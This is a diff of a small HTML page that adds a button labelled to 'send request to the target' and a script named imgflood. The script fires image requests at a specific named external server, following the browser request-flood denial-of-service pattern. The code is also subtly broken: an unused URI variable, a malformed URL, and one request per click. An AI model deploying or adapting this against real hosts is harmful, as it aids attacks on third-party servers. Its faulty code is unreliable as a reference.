@@ -1,7 +1,32 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Trang Web Đơn Giản</title>
+</head>
 <body>
-<h1>Hello World</h1>
-<p>Day chinh la page cua Thai.</p>
+    <h1>Xin chào, đây là trang web đơn giản!</h1>
+    
+    <button id="myButton">click to send request to the target</button>
+    
+    <script>
+        // Định nghĩa hàm imgflood
+        function imgflood() {
+            var TARGET = 'remote.sonic.com.vn';
+            var URI = '/index.php?';
+            var pic = new Image();
+            var rand = Math.floor(Math.random() * 1000);
+            pic.src = 'https://' + TARGET + rand + '=val';
+        }
+
+        // Lấy tham chiếu đến nút bấm bằng ID
+        var button = document.getElementById("myButton");
+        
+        // Thêm sự kiện click cho nút bấm
+        button.addEventListener("click", function() {
+            // Gọi hàm imgflood khi nút bấm được nhấp vào
+            imgflood();
+        });
+    </script>
 </body>
 </html>
+
